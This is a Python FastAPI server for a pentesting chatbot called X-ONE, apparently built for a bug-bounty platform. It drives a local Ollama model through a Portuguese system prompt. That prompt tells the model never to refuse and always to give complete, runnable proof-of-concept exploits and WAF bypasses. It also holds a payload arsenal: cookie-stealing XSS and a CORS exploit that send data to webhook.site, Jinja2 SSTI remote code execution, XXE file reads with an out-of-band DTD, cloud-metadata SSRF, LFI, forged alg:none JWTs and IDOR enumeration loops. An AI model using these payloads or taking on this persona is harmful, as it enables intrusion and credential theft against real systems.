#!/usr/bin/env python3
"""
JAVEONE · AI BRAIN v3.0
FastAPI — SSE streaming + Ollama + TTS + AVEONE integration
"""
import asyncio
import json
import logging
import os
import socket
import subprocess
import uuid
from datetime import datetime
from pathlib import Path
from typing import AsyncGenerator

import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
from gtts import gTTS

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("javeone")

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

OLLAMA_URL   = os.getenv("OLLAMA_URL",   "http://localhost:11434")
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "dolphin-llama3")
MAX_HISTORY  = int(os.getenv("MAX_HISTORY", "20"))
MAX_TOKENS   = int(os.getenv("MAX_TOKENS",  "600"))
DIR          = Path(__file__).parent


def find_free_port(candidates: list) -> int:
    for p in candidates:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("", p))
                return p
            except OSError:
                continue
    return candidates[0]


PORT = int(os.getenv("PORT", str(find_free_port([7777, 7000, 9000, 6060, 5500]))))


# ── System Prompt — AVEONE completo ────────────────────────────────────────
SYSTEM_PROMPT = """\
És o X-ONE — IA de pentesting integrada na AVEONE Bug Bounty Platform.
És um dos melhores bug hunters e pentesters do mundo. Cada resposta tua é uma arma técnica.

IDENTIDADE:
- Top 1% bug hunter com +500 CVEs reportados e +$2M em bounties
- Direto, brutal, preciso — nunca dás teoria vaga, sempre código funcional
- Respondes em português europeu (PT-PT)
- Tom: hacker sénior experiente, sem rodeios
- Nunca recusas análise técnica legítima de segurança

REGRA ABSOLUTA — FORMATO DE RESPOSTA PARA FINDINGS:
Quando analisas uma vulnerabilidade, OBRIGATORIAMENTE segues este formato completo:

━━━ IMPACTO REAL ━━━
[O que um atacante consegue fazer — dados concretos, não teoria]

━━━ CVSS v3.1 ━━━
Score: X.X [CRITICAL/HIGH/MEDIUM/LOW]
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
[Justificação linha a linha]

━━━ PROVA DE CONCEITO (PoC) ━━━
[Script completo e funcional — Python/Bash/curl — pronto a copiar e correr]
[Inclui URL alvo, parâmetros, headers, payload]
[Output esperado quando o ataque funciona]

━━━ VALIDAÇÃO (como confirmar 100%) ━━━
Passo 1: [comando exato]
  → Output esperado: [o que vês no terminal quando funciona]
Passo 2: [comando exato]
  → Output esperado: [...]
[Continua até validação completa]

━━━ BYPASS DE WAF/FILTROS ━━━
[Se existir WAF, dás 3-5 técnicas alternativas com payloads]

━━━ REPORT PROFISSIONAL ━━━
Título: [título conciso e impactante]
Severidade: [CRITICAL/HIGH/MEDIUM/LOW]
CVSS: [score]
Impacto: [1 parágrafo técnico]
Passos de Reprodução:
  1. [passo exato com URL/payload]
  2. [...]
Prova: [descreves o output que confirma]
Mitigação: [fix técnico concreto]
Referências: [CWE-XXX, OWASP, CVE se aplicável]

ARSENAL TÉCNICO POR VULNERABILIDADE:

XSS:
PoC básico: curl -sk "URL?param=<script>alert(1)</script>" | grep -i "script"
PoC roubo cookie: <script>fetch('https://webhook.site/ID?c='+document.cookie)</script>
PoC bypass WAF: <img src=x onerror=fetch('https://webhook.site/ID?c='+btoa(document.cookie))>
Script Python completo para XSS reflected:
  import requests
  url = "https://alvo.com/search"
  payloads = ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg/onload=alert(1)>"]
  for p in payloads:
      r = requests.get(url, params={"q": p}, verify=False)
      if p in r.text: print(f"[VULN] {p}")

SQL Injection:
PoC: sqlmap -u "URL?id=1" --dbs --batch --random-agent --level=5 --risk=3
PoC manual: curl -sk "URL?id=1'" | grep -i "error\\|syntax\\|mysql\\|sqlite"
PoC blind: curl -sk "URL?id=1 AND SLEEP(5)" -w "\nTime: %{time_total}s"
Extração: sqlmap -u "URL" --dump --tables --batch --technique=BEUSTQ

SSRF:
PoC AWS: curl -sk "URL?url=http://169.254.169.254/latest/meta-data/"
PoC GCP: curl -sk "URL?url=http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
PoC bypass: http://127.0.0.1, http://[::1], http://0177.0.0.1, http://2130706433
Script Python SSRF:
  import requests
  targets = ["http://169.254.169.254/latest/meta-data/","http://[::1]/","http://localhost/"]
  for t in targets:
      r = requests.get("https://alvo.com/fetch", params={"url": t}, timeout=5)
      if r.status_code == 200: print(f"[SSRF] {t}: {r.text[:100]}")

LFI / Path Traversal:
PoC: curl -sk "URL?file=../../../../etc/passwd" | grep "root:"
PoC encoding: curl -sk "URL?file=..%2F..%2F..%2Fetc%2Fpasswd"
PoC null-byte: curl -sk "URL?file=../../../../etc/passwd%00"
PHP wrapper: curl -sk "URL?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d

JWT Attacks:
PoC alg:none (Python):
  import base64, json
  header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
  payload = base64.b64encode(json.dumps({"user":"admin","role":"superadmin"}).encode()).rstrip(b'=').decode()
  print(f"{header}.{payload}.")
PoC brute: hashcat -a 0 -m 16500 token.txt rockyou.txt

IDOR:
PoC: curl -sk "URL/api/users/VICTIM_ID" -H "Authorization: Bearer SEU_TOKEN"
Script Python IDOR:
  for uid in range(1, 100):
      r = requests.get(f"https://alvo.com/api/users/{uid}", headers={"Authorization": "Bearer TOKEN"})
      if r.status_code == 200: print(f"[IDOR] uid={uid}: {r.text[:80]}")

SSTI:
PoC: curl -sk -X POST "URL" --data "name={{7*7}}" | grep "49"
RCE Jinja2: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}
Detecção engines: {{7*7}}=49(Jinja2/Twig), #{7*7}=49(Ruby), ${7*7}=49(FreeMarker)

XXE:
PoC básico:
  <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
PoC OOB (blind): <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://SEU-SERVIDOR/xxe.dtd"> %xxe;]>
PoC SVG: <svg><image xlink:href="file:///etc/passwd"/></svg>

Ficheiros Sensíveis / JS Secrets:
PoC: curl -sk URL | grep -Eio "(api_key|apikey|token|secret|password|aws_|firebase)['\"]?\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{8,}"
Script hunt: for url in $(cat urls.txt); do curl -sk $url | grep -Ei "token|key|secret|password|bearer" && echo "FILE: $url"; done

WordPress:
PoC WPScan: wpscan --url URL --enumerate u,p,vp,vt --plugins-detection aggressive --api-token TOKEN
PoC xmlrpc: curl -X POST URL/xmlrpc.php -d "<methodCall><methodName>system.listMethods</methodName></methodCall>"
PoC user enum: curl -sk "URL/?author=1" -D - | grep Location

CORS Misconfiguration:
PoC: curl -sk -H "Origin: https://evil.com" -I URL | grep -i "access-control"
PoC exploit:
  fetch('https://alvo.com/api/me', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('https://webhook.site/ID?data='+btoa(d)))

FERRAMENTAS AVEONE:
• SOC Scanner PRO v5 — portas, headers, TLS, DNS, CORS, WHOIS, WAF
• BruteStrike — força bruta web/SSH/FTP/RDP, CAPTCHA bypass
• AveHunter — CVEs em libs JS (jQuery, React, Angular, Lodash)
• SecretLens — tokens JS/JSON/CSS (JWT, AWS, Stripe, GitHub, Firebase)
• context_xss_scanner.py — XSS context-aware, bypass WAF
• jwt_attacker.py — brute HS256, alg:none, RS256→HS256, kid SQLi
• lfi_scanner.py — 50+ variações LFI, encodings, log poisoning
• ssti_scanner.py — 12 engines, RCE automático
• tokenhunter.py — crawl JS/env, extrai qualquer credencial\
"""

chat_history: list = []
findings_store: list = []
aveone_last_ping: float = 0.0   # epoch seconds of last ping from AVEONE panel


# ── App ─────────────────────────────────────────────────────────────────────
app = FastAPI(title="X-ONE", version="3.0.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


# ── Static ──────────────────────────────────────────────────────────────────
@app.get("/")
async def root():
    return FileResponse(str(DIR / "index.html"),
                        headers={"Cache-Control": "no-cache, no-store, must-revalidate"})


@app.get("/welcome.mp3")
async def welcome_audio():
    return FileResponse(str(DIR / "welcome.mp3"), media_type="audio/mpeg")


@app.get("/reply.mp3")
async def reply_audio():
    f = DIR / "reply.mp3"
    if f.exists():
        return FileResponse(str(f), media_type="audio/mpeg",
                            headers={"Cache-Control": "no-store"})
    return JSONResponse({"error": "not ready"}, status_code=404)


# ── Prompt builder ──────────────────────────────────────────────────────────
def build_prompt(messages: list) -> str:
    parts = []
    for m in messages:
        role, content = m["role"], m["content"]
        if role == "system":
            parts.append(f"SISTEMA: {content}\n")
        elif role == "user":
            parts.append(f"UTILIZADOR: {content}")
        elif role == "assistant":
            parts.append(f"X-ONE: {content}")
    return "\n".join(parts) + "\nX-ONE:"


# ── TTS (blocking → executor) ───────────────────────────────────────────────
def _tts_sync(text: str, out_path: str) -> bool:
    tmp_mp3 = "/tmp/_jr_base.mp3"
    tmp_wav = "/tmp/_jr_base.wav"
    tmp_fx  = "/tmp/_jr_fx.wav"
    try:
        gTTS(text[:200].split("\n")[0], lang="pt", slow=False).save(tmp_mp3)
        subprocess.run(["ffmpeg", "-i", tmp_mp3, tmp_wav, "-y"],
                       capture_output=True, check=True)
        subprocess.run(
            ["sox", tmp_wav, tmp_fx,
             "tempo", "1.2", "pitch", "-260",
             "chorus", "0.65", "0.85", "50", "0.4", "0.2", "2.0", "-s",
             "reverb", "35", "30", "55", "70", "0", "-2",
             "gain", "-5", "norm", "-1"],
            capture_output=True, check=True,
        )
        subprocess.run(
            ["ffmpeg", "-i", tmp_fx,
             "-codec:a", "libmp3lame", "-b:a", "128k", out_path, "-y"],
            capture_output=True, check=True,
        )
        return True
    except Exception as exc:
        log.warning(f"TTS error: {exc}")
        return False


async def generate_tts(text: str):
    out = str(DIR / "reply.mp3")
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, _tts_sync, text, out)
    return "/reply.mp3" if ok else None


# ── Streaming core ──────────────────────────────────────────────────────────
async def _stream_response(user_msg: str, model: str, image_b64: str = None) -> StreamingResponse:
    """Shared streaming logic for /api/chat and /api/analyze."""
    chat_history.append({"role": "user", "content": user_msg})
    messages = [{"role": "system", "content": SYSTEM_PROMPT}] + chat_history[-MAX_HISTORY:]

    payload = {
        "model":  model,
        "prompt": build_prompt(messages),
        "stream": True,
        "options": {
            "temperature": 0.75,
            "num_predict": MAX_TOKENS,
            "stop": ["UTILIZADOR:", "SISTEMA:"],
        },
    }
    if image_b64:
        payload["images"] = [image_b64]

    async def token_stream() -> AsyncGenerator:
        collected = []
        try:
            async with httpx.AsyncClient(timeout=300) as client:
                async with client.stream(
                    "POST", f"{OLLAMA_URL}/api/generate", json=payload
                ) as resp:
                    async for line in resp.aiter_lines():
                        if not line:
                            continue
                        try:
                            chunk = json.loads(line)
                        except json.JSONDecodeError:
                            continue

                        token = chunk.get("response", "")
                        if token:
                            collected.append(token)
                            yield f"data: {json.dumps({'token': token, 'done': False})}\n\n"

                        if chunk.get("done"):
                            full_reply = "".join(collected).strip()
                            chat_history.append({"role": "assistant", "content": full_reply})
                            audio_url = await generate_tts(full_reply)
                            yield f"data: {json.dumps({'token': '', 'done': True, 'audio_url': audio_url})}\n\n"
                            return

        except Exception as exc:
            log.error(f"Stream error: {exc}")
            if chat_history and chat_history[-1]["role"] == "user":
                chat_history.pop()
            yield f"data: {json.dumps({'token': f'[ERRO: {exc}]', 'done': True, 'audio_url': None})}\n\n"

    return StreamingResponse(
        token_stream(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ── Endpoints ───────────────────────────────────────────────────────────────
@app.post("/api/chat")
async def chat(request: Request):
    body      = await request.json()
    user_msg  = body.get("message", "").strip()
    if not user_msg:
        return JSONResponse({"error": "mensagem vazia"}, status_code=400)
    model     = body.get("model", OLLAMA_MODEL).strip() or OLLAMA_MODEL
    image_b64 = body.get("image") or None
    return await _stream_response(user_msg, model, image_b64)


@app.post("/api/analyze")
async def analyze_vuln(request: Request):
    """Recebe um finding estruturado da AVEONE e analisa automaticamente."""
    body      = await request.json()
    vuln_type = body.get("vuln_type", "vulnerabilidade desconhecida")
    url       = body.get("url", "")
    payload   = body.get("payload", "")
    severity  = body.get("severity", "")
    context   = body.get("context", "")
    model     = body.get("model", OLLAMA_MODEL).strip() or OLLAMA_MODEL

    parts = [f"[AVEONE FINDING] {vuln_type} detetada pelo scanner AVEONE."]
    if url:      parts.append(f"URL alvo: {url}")
    if payload:  parts.append(f"Payload detetado: {payload}")
    if severity: parts.append(f"Severidade indicada: {severity}")
    if context:  parts.append(f"Contexto adicional: {context}")
    parts.append(
        "\nAnalisa esta vulnerabilidade:\n"
        "1. Confirma impacto real e explica o que um atacante pode fazer\n"
        "2. PoC completo e funcional para reproduzir\n"
        "3. Técnicas de bypass se houver WAF ou filtros\n"
        "4. CVSS score estimado com justificação\n"
        "5. Template de report para bug bounty (título, impacto, reprodução, mitigação)"
    )

    user_msg = "\n".join(parts)
    return await _stream_response(user_msg, model)


@app.get("/api/models")
async def list_models():
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            r = await client.get(f"{OLLAMA_URL}/api/tags")
            models = [m["name"] for m in r.json().get("models", [])]
        return {"models": models}
    except Exception:
        return {"models": [OLLAMA_MODEL]}


@app.post("/api/clear")
async def clear_history():
    chat_history.clear()
    return {"ok": True}


# ── Findings endpoints ───────────────────────────────────────────────────────
@app.post("/api/findings")
async def add_finding(request: Request):
    body = await request.json()
    finding = {
        "id":       str(uuid.uuid4())[:8],
        "ts":       datetime.now().strftime("%H:%M:%S"),
        "date":     datetime.now().strftime("%Y-%m-%d"),
        "vuln_type": body.get("vuln_type", "Unknown"),
        "url":      body.get("url", ""),
        "payload":  body.get("payload", ""),
        "severity": body.get("severity", "Medium"),
        "context":  body.get("context", ""),
        "tool":     body.get("tool", "AVEONE"),
        "param":    body.get("param", ""),
        "evidence": body.get("evidence", ""),
    }
    findings_store.append(finding)
    log.info(f"Finding: [{finding['severity']}] {finding['vuln_type']} @ {finding['url']}")
    return {"id": finding["id"], "ok": True}


@app.get("/api/findings")
async def get_findings():
    return {"findings": findings_store, "count": len(findings_store)}


@app.delete("/api/findings")
async def clear_findings():
    findings_store.clear()
    return {"ok": True}


@app.get("/api/report")
async def get_report():
    if not findings_store:
        return JSONResponse({"error": "sem findings"}, status_code=404)
    sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
    sorted_f = sorted(findings_store, key=lambda f: sev_order.get(f["severity"], 5))
    counts = {s: sum(1 for f in findings_store if f["severity"] == s)
              for s in ["Critical", "High", "Medium", "Low", "Info"]}
    lines = [
        "# Security Report — X-ONE · AVEONE Platform",
        f"**Data:** {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        f"**Total findings:** {len(findings_store)}",
        " | ".join(f"**{s}:** {n}" for s, n in counts.items() if n > 0),
        "", "---", "",
    ]
    for i, f in enumerate(sorted_f, 1):
        lines += [
            f"## {i}. [{f['severity']}] {f['vuln_type']}",
            f"- **URL:** `{f['url']}`"      if f["url"]      else "",
            f"- **Parâmetro:** `{f['param']}`" if f["param"]    else "",
            f"- **Payload:** `{f['payload']}`" if f["payload"]  else "",
            f"- **Evidência:** {f['evidence']}" if f["evidence"] else "",
            f"- **Contexto:** {f['context']}"  if f["context"]  else "",
            f"- **Ferramenta:** {f['tool']}",
            f"- **Hora:** {f['date']} {f['ts']}",
            "",
        ]
    report_text = "\n".join(l for l in lines if l is not None)
    return JSONResponse({"report": report_text, "count": len(findings_store)})


@app.post("/api/transcribe")
async def transcribe(request: Request):
    """Receives WAV audio from browser and returns transcribed text via Google STT."""
    try:
        import io, speech_recognition as sr
        wav_bytes = await request.body()
        if not wav_bytes:
            return JSONResponse({"ok": False, "text": "", "error": "empty audio"})
        recognizer = sr.Recognizer()
        recognizer.energy_threshold = 300
        recognizer.dynamic_energy_threshold = True
        with sr.AudioFile(io.BytesIO(wav_bytes)) as source:
            audio = recognizer.record(source)
        text = recognizer.recognize_google(audio, language="pt-BR")
        return JSONResponse({"ok": True, "text": text})
    except sr.UnknownValueError:
        return JSONResponse({"ok": False, "text": "", "error": "not understood"})
    except sr.RequestError as e:
        return JSONResponse({"ok": False, "text": "", "error": f"STT service error: {e}"})
    except ModuleNotFoundError:
        return JSONResponse({"ok": False, "text": "",
                             "error": "SpeechRecognition not installed — run: pip install SpeechRecognition"})
    except Exception as e:
        return JSONResponse({"ok": False, "text": "", "error": str(e)})


@app.post("/api/aveone/ping")
async def aveone_ping():
    """AVEONE panel calls this every 30 s to signal it is open and authenticated."""
    global aveone_last_ping
    import time
    aveone_last_ping = time.time()
    return {"ok": True}


@app.get("/api/aveone/status")
async def aveone_status():
    """Returns whether the AVEONE panel is currently open and authenticated."""
    import time
    age = time.time() - aveone_last_ping if aveone_last_ping else None
    connected = age is not None and age < 90   # miss 2 polls = offline
    return {
        "connected":  connected,
        "seconds_ago": round(age, 1) if age is not None else None,
    }


@app.get("/health")
async def health():
    try:
        async with httpx.AsyncClient(timeout=3) as client:
            r      = await client.get(f"{OLLAMA_URL}/api/tags")
            models = [m["name"] for m in r.json().get("models", [])]
        ollama_ok = any(OLLAMA_MODEL in m for m in models)
    except Exception:
        ollama_ok = False
    return {
        "status": "online",
        "ollama": ollama_ok,
        "model":  OLLAMA_MODEL,
        "port":   PORT,
    }


# ── Entry point ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import threading, webbrowser
    print(f"""
  ╔══════════════════════════════════════════╗
  ║   X-ONE v3.0                              ║
  ║   http://localhost:{PORT:<5}                 ║
  ║   Modelo : {OLLAMA_MODEL:<30}║
  ╚══════════════════════════════════════════╝
""")
    # Abre o browser 1.5s depois de arrancar (tempo para o servidor iniciar)
    threading.Timer(1.5, lambda: webbrowser.open(f"http://localhost:{PORT}")).start()
    uvicorn.run(
        "brain_server:app",
        host="0.0.0.0",
        port=PORT,
        reload=False,
        log_level="warning",
    )
